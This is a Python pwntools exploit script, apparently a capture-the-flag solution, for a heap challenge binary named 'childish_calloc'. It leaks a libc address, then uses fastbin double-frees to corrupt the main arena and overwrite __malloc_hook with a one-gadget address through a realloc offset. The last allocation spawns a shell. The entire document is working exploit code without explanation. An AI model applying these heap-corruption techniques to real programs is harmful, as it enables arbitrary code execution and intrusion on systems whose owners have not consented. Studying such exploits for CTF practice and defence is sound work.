#!/usr/bin/env python3


from pwn import *

e = ELF("./childish_calloc")
r = process("./childish_calloc")
libc = ELF("./libc.so.6")

def small_malloc(index,size,data):
    r.sendlineafter(b"Choice",b"1")
    r.sendlineafter(b"index",f"{index}")
    r.sendlineafter(b"How much space do you need for it",f"{size}")
    r.sendafter(b"toy's details",data)

def free(index):
    r.sendlineafter(b"Choice",b"2")
    r.sendlineafter(b"index",f"{index}")
    r.sendlineafter(b"How much space do you need for this repair",b"100")

def edit(index,size,data):
    r.sendlineafter(b"Choice",b"2")
    r.sendlineafter(b"index",f"{index}")
    r.sendlineafter(b"How much space do you need for this repair",f"{size}")
    r.sendafter(b"Input your toy's details",data)
    r.sendlineafter(b"Select choice:",b"1")

def read(index):
    r.sendlineafter(b"Choice",b"3")
    r.sendlineafter(b"index:",f"{index}")
    libc_leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
    return libc_leak

def large_malloc(size):
    r.sendlineafter(b"Choice",b"4")
    r.sendlineafter(b"massive toy",f"{size}")

def win(index,size):
    r.sendlineafter(b"Choice",b"1")
    r.sendlineafter(b"index",f"{index}")
    r.sendlineafter(b"How much space do you need for it",f"{size}")


small_malloc(13,40,b"A" * 8)
small_malloc(1,40,b"B" * 8)
free(13)
large_malloc(1500)
libc_base = read(13) - 0x3ebcc0
log.info("The libc base of the process is " + hex(libc_base))
small_malloc(2,40,b"C" * 8)
free(2)
free(1)
free(2)
small_malloc(3,40,p64(0x41))
small_malloc(4,40,b"D" * 8)
small_malloc(5,40,b"E" * 8)
log.info("The main arena of the process is " + hex(libc_base + 0x3ebc50))
small_malloc(6,56,b"F" * 8)
small_malloc(7,56,b"G" * 8)
free(6)
free(7)
free(6)
small_malloc(8,56,p64(libc_base + 0x3ebc50))
small_malloc(9,56,b"H" * 8)
small_malloc(10,56,b"I" * 8)
log.info("The free_hook and malloc_hook of the process is " + hex(libc_base + libc.sym.__free_hook) + " " + hex(libc_base + libc.sym.__malloc_hook))
small_malloc(11,56,p64(libc_base + 0x3ebc80) + p64(0) * 4 + p64(0x43))
small_malloc(12,56,b"/bin/sh\x00" + p64(0) + p64(libc_base + libc.sym.__malloc_hook -0x28))
small_malloc(14,56,b"A" * 16 + p64(libc_base + 0x4f2c5)  + p64(libc_base + libc.sym.realloc + 2))
win(0,56)
r.interactive()
